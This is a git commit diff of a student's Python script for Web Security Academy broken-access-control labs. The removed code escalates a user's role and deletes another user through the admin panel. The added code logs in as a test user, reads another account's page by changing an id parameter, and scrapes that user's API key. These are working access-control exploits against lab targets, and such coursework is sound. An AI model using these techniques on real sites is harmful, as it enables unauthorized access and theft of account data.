e2a70e06ad4623e2673621db36fa08fac75d05b9
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-18 21:04:52 -0700

    completed 1.5.7

--- Lab Notebook #1/Lab 1.5/Lab_1-5_Broken-access-control_1.py
+++ Lab Notebook #1/Lab 1.5/Lab_1-5_Broken-access-control_1.py
@@ -1,48 +1,31 @@
 import requests
 from bs4 import BeautifulSoup
+import re
 
-site = 'ac5b1f1d1eea38bd800bb785005a0066.web-security-academy.net'
+
 s = requests.Session()
-
+site = 'ac981f7b1efd76d38070105000c8005e.web-security-academy.net'
 login_url = f'https://{site}/login'
-login_data = {'password': 'peter', 'username': 'wiener'}
-resp = s.post(login_url, data=login_data)
-
-upgrade_data = {
-    'action': 'upgrade',
-    'username': 'wiener'
-}
-
-url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
-url_2 = f'https://{site}/admin'
-resp = s.get(url)
-resp = s.get(url_2)
-print(resp.status_code)
-# print(resp.text)
-
-
-"""site = 'ac3a1fdf1f277524800f73e1002e007d.web-security-academy.net'
-s = requests.Session()
-login_url = f'https://{site}/login'
-login_data = {'password': 'peter', 'username': 'wiener'}
-resp = s.post(login_url, data=login_data)
-
-change_url = f'https://{site}/my-account/change-email'
-json_data = {'email': 'semchuk2@pdx.edu'}
-resp = s.post(change_url, json=json_data, allow_redirects=False)
-print(resp.status_code)
-print(resp.text)
-
-json_data = {'email': 'semchuk2@pdx.edu', 'roleid': 2}
-resp = s.post(change_url, json=json_data, allow_redirects=False)
-print(resp.text)
-
-admin_url = f'https://{site}/admin'
-resp = s.get(admin_url)
+resp = s.get(login_url)
 soup = BeautifulSoup(resp.text, 'html.parser')
+csrf = soup.find('input', {'name': 'csrf'}).get('value')
 
-carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
+logindata = {
+    'csrf': csrf,
+    'username': 'wiener',
+    'password': 'peter'
+}
+resp = s.post(login_url, data=logindata)
+print(resp.status_code)
 
-delete_uri = carlos_delete_link[0]['href']
-s.get(f'https://{site}{delete_uri}')
-"""
+# Now to get the API Key:
+
+resp = s.get(url='https://ac981f7b1efd76d38070105000c8005e.web-security-academy.net/my-account?id=carlos', data=logindata)
+print(resp)
+soup = BeautifulSoup(resp.text, 'html.parser')
+div_text = soup.find('div', text=re.compile('API')).text
+api_key = div_text.split(' ')[4]
+print(api_key)
+
+url = f'https://{site}/submitSolution'
+resp = s.post(url, data={'answer': api_key})
